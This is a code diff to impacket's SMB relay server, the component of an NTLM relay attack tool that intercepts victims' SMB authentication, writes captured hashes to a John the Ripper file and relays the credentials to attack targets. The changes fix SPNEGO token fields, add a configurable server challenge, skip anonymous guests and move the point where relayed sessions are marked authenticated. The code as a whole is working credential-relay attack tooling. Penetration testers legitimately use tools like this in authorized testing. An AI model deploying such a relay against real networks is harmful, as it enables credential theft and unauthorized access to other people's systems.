@@ -29,7 +29,7 @@ import string
 import socket
 import ntpath
 
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 from six import b
 from impacket import smb, ntlm, LOG, smb3
 from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS, STATUS_NETWORK_SESSION_EXPIRED
@@ -71,6 +71,9 @@ class SMBRelayServer(Thread):
 
         if self.config.outputFile is not None:
             smbConfig.set('global','jtr_dump_path',self.config.outputFile)
+
+        if self.config.SMBServerChallenge is not None:
+            smbConfig.set('global', 'challenge', self.config.SMBServerChallenge)
 
         # IPC always needed
         smbConfig.add_section('IPC$')
@@ -209,8 +212,10 @@ class SMBRelayServer(Thread):
                    smbServer.log("Unsupported MechType '%s'" % mechStr, logging.CRITICAL)
                    # We don't know the token, we answer back again saying
                    # we just support NTLM.
-                   # ToDo: Build this into a SPNEGO_NegTokenResp()
-                   respToken = b'\xa1\x15\x30\x13\xa0\x03\x0a\x01\x03\xa1\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'
+                   respToken = SPNEGO_NegTokenResp()
+                   respToken['NegState'] = b'\x03'  # request-mic
+                   respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
+                   respToken = respToken.getData()
                    respSMBCommand['SecurityBufferOffset'] = 0x48
                    respSMBCommand['SecurityBufferLength'] = len(respToken)
                    respSMBCommand['Buffer'] = respToken
@@ -254,7 +259,7 @@ class SMBRelayServer(Thread):
             if rawNTLM is False:
                 respToken = SPNEGO_NegTokenResp()
                 # accept-incomplete. We want more data
-                respToken['NegResult'] = b'\x01'
+                respToken['NegState'] = b'\x01'
                 respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
 
                 respToken['ResponseToken'] = challengeMessage.getData()
@@ -333,7 +338,7 @@ class SMBRelayServer(Thread):
             if rawNTLM is False:
                 respToken = SPNEGO_NegTokenResp()
                 # accept-completed
-                respToken['NegResult'] = b'\x00'
+                respToken['NegState'] = b'\x00'
             else:
                 respToken = ''
             # Let's store it in the connection data
@@ -369,7 +374,10 @@ class SMBRelayServer(Thread):
         try:
             if self.config.mode.upper () == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor (singleTarget='SMB://%s:445/' % connData['ClientIP'])
-
+            if self.authUser == '/':
+                LOG.info('SMBD-%s: Connection from %s authenticated as guest (anonymous). Skipping target selection.' %
+                         (connId, connData['ClientIP']))
+                return self.origsmb2TreeConnect (connId, smbServer, recvPacket)
             self.target = self.targetprocessor.getTarget(identity = self.authUser)
             if self.target is None:
                 # No more targets to process, just let the victim to fail later
@@ -508,7 +516,7 @@ class SMBRelayServer(Thread):
 
                 respToken = SPNEGO_NegTokenResp()
                 # accept-incomplete. We want more data
-                respToken['NegResult'] = b'\x01'
+                respToken['NegState'] = b'\x01'
                 respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                 respToken['ResponseToken'] = challengeMessage.getData()
 
@@ -588,7 +596,11 @@ class SMBRelayServer(Thread):
 
                 respToken = SPNEGO_NegTokenResp()
                 # accept-completed
-                respToken['NegResult'] = b'\x00'
+                respToken['NegState'] = b'\x00'
+
+                # Done with the relay for now.
+                connData['Authenticated'] = True
+                del(connData['relayToHost'])
 
                 # Status SUCCESS
                 errorCode = STATUS_SUCCESS
@@ -653,6 +665,9 @@ class SMBRelayServer(Thread):
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                           self.server.getJTRdumpPath())
 
+                # Done with the relay for now.
+                connData['Authenticated'] = True
+                del(connData['relayToHost'])
                 self.do_attack(client)
                 # Now continue with the server
             #############################################################
@@ -662,9 +677,6 @@ class SMBRelayServer(Thread):
         respSMBCommand['Parameters'] = respParameters
         respSMBCommand['Data']       = respData
 
-        # From now on, the client can ask for other commands
-        connData['Authenticated'] = True
-        del(connData['relayToHost'])
 
         smbServer.setConnectionData(connId, connData)
 
@@ -686,13 +698,16 @@ class SMBRelayServer(Thread):
         try:
             if self.config.mode.upper () == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor (singleTarget='SMB://%s:445/' % connData['ClientIP'])
-
+            if self.authUser == '/':
+                LOG.info('SMBD-%s: Connection from %s authenticated as guest (anonymous). Skipping target selection.' %
+                         (connId, connData['ClientIP']))
+                return self.origsmbComTreeConnectAndX (connId, smbServer, recvPacket)
             self.target = self.targetprocessor.getTarget(identity = self.authUser)
             if self.target is None:
                 # No more targets to process, just let the victim to fail later
                 LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' %
                          (connId, self.authUser, connData['ClientIP']))
-                return self.origsmb2TreeConnect (connId, smbServer, recvPacket)
+                return self.origsmbComTreeConnectAndX (connId, smbServer, recvPacket)
 
             LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % ( connId, self.authUser,
                                                         connData['ClientIP'], self.target.scheme, self.target.netloc))
